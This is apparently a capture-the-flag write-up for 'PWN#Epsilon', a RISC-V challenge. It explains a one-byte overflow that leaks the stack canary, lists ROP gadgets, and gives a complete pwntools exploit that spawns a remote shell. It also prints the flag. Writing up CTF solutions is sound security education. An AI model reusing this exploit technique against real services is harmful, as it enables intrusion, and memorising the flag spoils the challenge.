---
title: "PWN#Epsilon"
category: "Pwn"
tags: ["riscv64", "stack-overflow", "canary-leak", "ret2system", "static-binary", "qemu"]
solve_date: "2026-11-02T13:01:02+07:00"
language: "en"
points: 64
---

# PWN#Epsilon — RISC-V vault: one-byte canary leak to `system("/bin/sh")`

**Flag:** `CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}`
**Service:** `nc 169.58.126.107 5003`
**Flag format:** `CTF{}`

## Challenge

> PWN#Epsilon — 64 points. Get a shell on the remote host and read the flag.

The handout is a single `vault` binary:

```text
ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI,
statically linked, stripped, BuildID 8853ac948f2a7eaee1cb7640e5a3b247c1141a26
```

It is non-PIE, NX is enabled, and it does have a stack canary — `checksec` misses it because the binary is static and stripped.

## Analysis

### The vulnerable function

`main` at `0x10608` uses a 96-byte frame with a 64-byte name buffer. It performs two reads:

```c
read(0, buf, 65);            // one byte past the 64-byte buffer
printf("Hello, %s\n", buf);  // string leak
read(0, buf, 200);           // full overflow
```

The first read writes 65 bytes. The 65th byte overwrites the least-significant byte of the stack canary (normally `0x00`). Because `printf("%s")` continues until a NUL byte, the output after the name includes:

- the 65 input bytes,
- the remaining 7 bytes of the canary,
- the saved `s0` and whatever follows until the next NUL.

That is enough to reconstruct the canary:

```python
canary = u64(b"\x00" + leak[65:72])
```

The second read then gives a classic stack overflow at offset 64.

### Gadgets

The static binary provides everything needed without a libc base:

| Symbol | Address | Purpose |
|---|---:|---|
| `GADGET_MV_A0` | `0x156b8` | `ld ra,24(sp); mv a0,s0; ld s0,16(sp); addi sp,sp,32; ret` |
| `DO_SYSTEM` | `0x10f6a` | `do_system(const char *line)` |
| `BIN_SH` | `0x52ab8` | string `"/bin/sh"` |

The gadget loads `a0` from the restored `s0`, then returns through the value at `sp+24`. Putting `"/bin/sh"` in the saved `s0` slot and `do_system` at `sp+24` yields `system("/bin/sh")`.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "riscv64"

CANARY_OFF   = 64
GADGET_MV_A0 = 0x156b8
DO_SYSTEM    = 0x10f6a
BIN_SH       = 0x52ab8

p = remote("169.58.126.107", 5003)

p.recvuntil(b"Enter your name: ")
p.send(b"A" * 64 + b"B")

prompt = b"Leave a message for the vault keeper: "
data = p.recvuntil(prompt)
idx = data.find(b"Hello, ")
leak = data[idx + len(b"Hello, "):-len(prompt)]
if leak.endswith(b"\n"):
    leak = leak[:-1]

canary = u64(b"\x00" + leak[65:72])
log.success("canary = %#x" % canary)

payload  = b"A" * 64
payload += p64(canary)
payload += p64(BIN_SH)        # saved s0 -> a0 via the gadget
payload += p64(GADGET_MV_A0)  # saved ra
payload += p64(0)             # sp+0
payload += p64(0)             # sp+8
payload += p64(0)             # sp+16 (s0 reload)
payload += p64(DO_SYSTEM)     # sp+24 -> ra for the gadget
assert len(payload) == 120

p.send(payload)
p.recv(timeout=2)
p.sendline(b"cat /flag/flag.txt")
print(p.recv(timeout=4).decode(errors="replace"))
```

The remote shell runs as `nobody`; the flag is at `/flag/flag.txt`.

```text
$ cat /flag/flag.txt
CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}
```

### Local reproduction

The exploit was tested locally with `qemu-riscv64` and a small busybox-static rootfs before being sent to the remote:

```bash
qemu-riscv64 -L tools/fakeroot ./vault
```

The canary leak and control-flow chain behave identically under QEMU.

## Notes

- The bug is deliberately small: a single extra byte in the first `read` turns the greeting into a canary disclosure.
- RISC-V static binaries are convenient targets here — `do_system` and `"/bin/sh"` are both present in the image, so no libc leak is required.
- The saved `s0` slot is reused as the `system()` argument; the gadget restores it into `a0` before returning to `do_system`.
